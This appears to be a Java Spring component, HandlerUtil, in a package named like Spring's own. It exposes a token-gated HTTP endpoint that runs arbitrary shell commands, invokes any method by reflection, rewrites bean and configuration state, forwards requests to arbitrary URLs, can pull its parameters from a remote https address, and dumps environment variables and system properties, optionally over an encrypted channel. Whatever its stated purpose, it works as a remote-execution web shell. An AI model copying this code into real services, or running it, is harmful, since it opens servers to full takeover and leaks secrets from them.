package org.springframework.service;

import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;
import io.netty.util.concurrent.FastThreadLocal;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.rx.bean.DateTime;
import org.rx.codec.CodecUtil;
import org.rx.codec.XChaCha20Poly1305Util;
import org.rx.core.StringBuilder;
import org.rx.core.*;
import org.rx.exception.ExceptionLevel;
import org.rx.exception.InvalidException;
import org.rx.exception.TraceHandler;
import org.rx.io.Bytes;
import org.rx.io.IOStream;
import org.rx.net.NetEventWait;
import org.rx.net.Sockets;
import org.rx.net.http.HttpClient;
import org.rx.util.BeanMapFlag;
import org.rx.util.BeanMapper;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.*;

import static org.rx.core.Extends.eq;
import static org.rx.core.Extends.ifNull;
import static org.rx.core.Sys.*;

@Slf4j
@Component
public class HandlerUtil {
    static final String PARAMS_NAME = "_p";
    static final String DOT = ".";
    static final FastThreadLocal<Boolean> idempotent = new FastThreadLocal<>();

    @SneakyThrows
    public boolean around(HttpServletRequest request, HttpServletResponse response) {
        if (Boolean.TRUE.equals(idempotent.get())) {
            return false;
        }
        boolean xcha = "1".equals(request.getParameter("_c"));
        JSONObject params;
        if (!auth(request) || (params = getParams(request, xcha)) == null) {
            return true;
        }

        Object resText = "0";
        idempotent.set(Boolean.TRUE);
        try {
            switch (params.getIntValue("x")) {
                case 1:
                    String multicast = request.getParameter("multicast");
                    if (multicast != null) {
                        String group = request.getParameter("group");
                        Integer mcId = Reflects.changeType(request.getParameter("mcId"), Integer.class);
                        NetEventWait.multicastLocal(Sockets.parseEndpoint(multicast), group, ifNull(mcId, 0));
                        resText = "1";
                    }
                    break;
                case 2:
                    String fu = request.getParameter("url");
                    if (fu != null) {
                        HttpClient client = new HttpClient();
                        Integer tm = Reflects.convertQuietly(request.getParameter("timeout"), Integer.class);
                        if (tm != null) {
                            client.withTimeoutMillis(tm);
                        }
                        client.forward(request, response, fu);
                    }
                    break;
                case 3:
                    String type = request.getParameter("type");
                    String jsonVal = request.getParameter("jsonVal");
                    Object target;
                    if (!Strings.isBlank(type)) {
                        Class<?> clazz = Class.forName(type);
                        target = SpringContext.getBean(clazz, false);
                        if (target != null && jsonVal != null) {
                            BeanMapper.DEFAULT.map(fromJson(jsonVal, clazz), target, BeanMapFlag.SKIP_NULL.flags());
                        }
                    } else {
                        target = RxConfig.INSTANCE;
                        if (jsonVal != null) {
                            RxConfig.INSTANCE.refreshFrom(toJsonObject(jsonVal));
                        }
                    }
                    resText = target;
                    break;
                case 5:
                    resText = Linq.from(InetAddress.getAllByName(params.getString("host"))).select(p -> p.getHostAddress()).toArray();
                    break;
                case 10:
                    String startTime = request.getParameter("startTime");
                    DateTime st = startTime == null ? null : DateTime.valueOf(startTime);
                    String endTime = request.getParameter("endTime");
                    DateTime et = endTime == null ? null : DateTime.valueOf(endTime);
                    String level = request.getParameter("level");
                    String kw = request.getParameter("keyword");
                    Boolean newest = Reflects.changeType(request.getParameter("newest"), Boolean.class);
                    Boolean methodOccurMost = Reflects.changeType(request.getParameter("methodOccurMost"), Boolean.class);
                    String methodNamePrefix = request.getParameter("methodNamePrefix");
                    String metricsName = request.getParameter("metricsName");
                    Integer take = Reflects.changeType(request.getParameter("take"), Integer.class);
                    resText = queryTraces(st, et, level, kw, newest, methodOccurMost, methodNamePrefix, metricsName, take);
                    break;
                case 11:
                    DateTime begin = Reflects.changeType(request.getParameter("begin"), DateTime.class);
                    DateTime end = Reflects.changeType(request.getParameter("end"), DateTime.class);
                    resText = findTopUsage(begin, end);
                    break;
                case 12:
                    resText = invokeEx(params.getString("expr"), params.getJSONArray("args"));
                    break;
                case 13:
                    resText = exec(params.getString("cmd"), params.getString("workspace"));
                    break;
                default:
                    resText = svrState(request, params);
                    break;
            }
        } catch (Throwable e) {
            resText = String.format("%s\n%s", e, ExceptionUtils.getStackTrace(e));
        } finally {
            idempotent.remove();
        }
        String r = resText instanceof String ? (String) resText : toJsonString(resText);
        if (xcha) {
            r = CodecUtil.convertToBase64(XChaCha20Poly1305Util.encrypt(r.getBytes(StandardCharsets.UTF_8)));
        }
        response.setContentType(MediaType.TEXT_PLAIN_VALUE);
        response.setCharacterEncoding("UTF-8");
        PrintWriter out = response.getWriter();
        out.write(r);
        out.flush();
        return false;
    }

    Map<String, Object> svrState(HttpServletRequest request, JSONObject params) {
        Map<String, Object> j = new LinkedHashMap<>();
        j.put("jarFile", Sys.getJarFile(this));
        j.put("inputArguments", ManagementFactory.getRuntimeMXBean().getInputArguments());
        try {
            Sys.diagnosticMx.setVMOption("UnlockCommercialFeatures", Boolean.TRUE.toString());
        } catch (Exception e) {
            j.put("UnlockCommercialFeatures", e.toString());
        }
        j.put("vmOptions", Sys.diagnosticMx.getDiagnosticOptions());
        //jackson json issue when ntp enable
        j.put("sysProperties", Linq.from(System.getProperties().entrySet()).toMap());
        j.put("sysEnv", System.getenv());
        Sys.Info info = Sys.mxInfo();
        JSONObject infoJson = toJsonObject(info);
        infoJson.put("usedPhysicalMemory", Bytes.readableByteSize(info.getUsedPhysicalMemory()));
        infoJson.put("freePhysicalMemory", Bytes.readableByteSize(info.getFreePhysicalMemory()));
        infoJson.put("totalPhysicalMemory", Bytes.readableByteSize(info.getTotalPhysicalMemory()));
        JSONObject summedDisk = infoJson.getJSONObject("summedDisk");
        summedDisk.put("usedSpace", Bytes.readableByteSize(info.getSummedDisk().getUsedSpace()));
        summedDisk.put("freeSpace", Bytes.readableByteSize(info.getSummedDisk().getFreeSpace()));
        summedDisk.put("totalSpace", Bytes.readableByteSize(info.getSummedDisk().getTotalSpace()));
        JSONArray disks = infoJson.getJSONArray("disks");
        int i = 0;
        for (Sys.DiskInfo disk : info.getDisks()) {
            JSONObject diskJson = disks.getJSONObject(i);
            diskJson.put("usedSpace", Bytes.readableByteSize(disk.getUsedSpace()));
            diskJson.put("freeSpace", Bytes.readableByteSize(disk.getFreeSpace()));
            diskJson.put("totalSpace", Bytes.readableByteSize(disk.getTotalSpace()));
            i++;
        }
        j.put("sysInfo", infoJson);
        j.put("rxConfig", RxConfig.INSTANCE);
        j.put("ntpOffset", Reflects.readStaticField(NtpClock.class, "offset"));

        Map<String, Object> threadInfo = new LinkedHashMap<>(5);
        j.put("threadInfo", threadInfo);
        Linq<ThreadEntity> ts = CpuWatchman.getLatestSnapshot();
        int take = Reflects.convertQuietly(request.getParameter("take"), Integer.class, 5);
        threadInfo.put("deadlocked", ts.where(ThreadEntity::isDeadlocked).select(p -> p.toString()));
        threadInfo.put("topUserTime", ts.orderByDescending(ThreadEntity::getUserNanos).take(take).select(p -> p.toString()));
        threadInfo.put("topCpuTime", ts.orderByDescending(ThreadEntity::getCpuNanos).take(take).select(p -> p.toString()));
        threadInfo.put("topBlockedTime", ts.orderByDescending(ThreadEntity::getBlockedTime).take(take).select(p -> p.toString()));
        threadInfo.put("topWaitedTime", ts.orderByDescending(ThreadEntity::getWaitedTime).take(take).select(p -> p.toString()));
        j.put("requestHeaders", Linq.from(Collections.list(request.getHeaderNames())).select(p -> String.format("%s: %s", p, String.join("; ", Collections.list(request.getHeaders(p))))));
        j.put("requestBody", params);
        j.putAll(queryTraces(null, null, null, null, null, null, null, null, take));
        return j;
    }

    Map<String, Object> queryTraces(Date startTime, Date endTime, String level, String keyword, Boolean newest, Boolean methodOccurMost, String methodNamePrefix, String metricsName, Integer take) {
        Map<String, Object> result = new LinkedHashMap<>(3);
        ExceptionLevel el = null;
        if (!Strings.isBlank(level)) {
            el = ExceptionLevel.valueOf(level);
        }
        result.put("errorTraces", TraceHandler.INSTANCE.queryExceptionTraces(startTime, endTime, el, keyword, newest, take));

        result.put("methodTraces", Linq.from(TraceHandler.INSTANCE.queryMethodTraces(methodNamePrefix, methodOccurMost, take)).select(p -> {
            Map<String, Object> t = Sys.toJsonObject(p);
            t.remove("elapsedMicros");
            t.put("elapsed", Sys.formatNanosElapsed(p.getElapsedMicros(), 1));
            return t;
        }));

        result.put("metrics", TraceHandler.INSTANCE.queryMetrics(metricsName, take));
        return result;
    }

    Map<String, Object> findTopUsage(Date begin, Date end) {
        Map<String, Object> result = new LinkedHashMap<>(5);
        Linq<CpuWatchman.ThreadUsageView> topUsage = CpuWatchman.findTopUsage(begin, end);
        result.put("deadlocked", topUsage.where(p -> p.getBegin().isDeadlocked() || p.getEnd().isDeadlocked()).select(CpuWatchman.ThreadUsageView::toString));

        result.put("topCpuTime", topUsage.orderByDescending(CpuWatchman.ThreadUsageView::getCpuNanosElapsed).select(CpuWatchman.ThreadUsageView::toString));

        result.put("topUserTime", topUsage.orderByDescending(CpuWatchman.ThreadUsageView::getUserNanosElapsed).select(CpuWatchman.ThreadUsageView::toString));

        result.put("topBlockedTime", topUsage.orderByDescending(CpuWatchman.ThreadUsageView::getBlockedElapsed).select(CpuWatchman.ThreadUsageView::toString));

        result.put("topWaitedTime", topUsage.orderByDescending(CpuWatchman.ThreadUsageView::getWaitedElapsed).select(CpuWatchman.ThreadUsageView::toString));
        return result;
    }

    @SneakyThrows
    Object invokeEx(String expr, List<Object> args) {
        int ms = expr.lastIndexOf(DOT);
        if (ms == -1) {
            throw new InvalidException("Class name not fund");
        }

        String mn = expr.substring(ms + 1);
        String cls = expr.substring(0, ms);

        int cs = ms;
        Class<?> kls;
        while (true) {
            try {
                kls = Class.forName(cls);
                break;
            } catch (ClassNotFoundException e) {
                if ((cs = cls.lastIndexOf(DOT)) == -1) {
                    throw e;
                }
                cls = cls.substring(0, cs);
            }
        }

        Object inst = ifNull(SpringContext.getBean(kls, false), kls);
        Object member = null;
        if (cs != ms) {
            String fieldExpr = expr.substring(cs + 1, ms);
            while (true) {
                int f = fieldExpr.indexOf(DOT);
                boolean end = f == -1;
                String fn = end ? fieldExpr : fieldExpr.substring(0, f);
                if (member == null) {
                    member = inst instanceof Class ? Reflects.readStaticField((Class<?>) inst, fn) : Reflects.readField(inst, fn);
                } else {
                    member = Reflects.readField(member, fn);
                }
                if (end) {
                    break;
                }
                fieldExpr = fieldExpr.substring(f + 1);
            }
        }

        Object ai;
        Class<?> at;
        if (member != null) {
            ai = member;
            at = member.getClass();
        } else if (inst instanceof Class) {
            ai = inst;
            at = (Class<?>) inst;
        } else {
            ai = inst;
            at = inst.getClass();
        }
        Method method = Reflects.getMethodMap(at).get(mn).where(p -> p.getParameterCount() == args.size()).first();
        Class<?>[] parameterTypes = method.getParameterTypes();
        Object[] a = Linq.from(method.getGenericParameterTypes()).select((p, i) -> {
            Object o = args.get(i);
            try {
                return fromJson(o, p);
            } catch (Exception e) {
                log.debug("invokeEx convert", e);
                return Reflects.changeType(o, parameterTypes[i]);
            }
        }).toArray();
        log.debug("invokeEx {}({})", method, toJsonString(a));
        return Reflects.invokeMethod(method, ai, a);
    }

    Object exec(String cmd, String workspace) {
        StringBuilder echo = new StringBuilder();
        ShellCommand sc = new ShellCommand(cmd, workspace);
        sc.onPrintOut.combine((s, e) -> echo.append(e.toString()));
        sc.start().waitFor(30000);
        return echo.toString();
    }

    @SneakyThrows
    JSONObject getParams(HttpServletRequest request, boolean xcha) {
        try {
            String b = request.getParameter(PARAMS_NAME);
            if (b == null) {
                b = IOStream.readString(request.getInputStream(), StandardCharsets.UTF_8);
            }
            log.info("rauth body:{}", b);
            if (Strings.isBlank(b)) {
                return null;
            }

            b = xcha ? new String(XChaCha20Poly1305Util.decrypt(CodecUtil.convertFromBase64(b)), StandardCharsets.UTF_8) : b;
            if (Strings.startsWith(b, "https")) {
                b = new HttpClient().get(b).toString();
            }
            return toJsonObject(b);
        } catch (Throwable e) {
            log.debug("around {}", e.toString());
            log.error("around",e);
            return null;
        }
    }

    boolean auth(HttpServletRequest request) {
        String h = "rtoken";
        String t = RxConfig.INSTANCE.getRtoken();
//        log.info("rauth {} = {} -> {}", request.getHeader(h), t, eq(request.getHeader(h), t));
        return eq(request.getHeader(h), t) || eq(request.getParameter(h), t);
    }
}
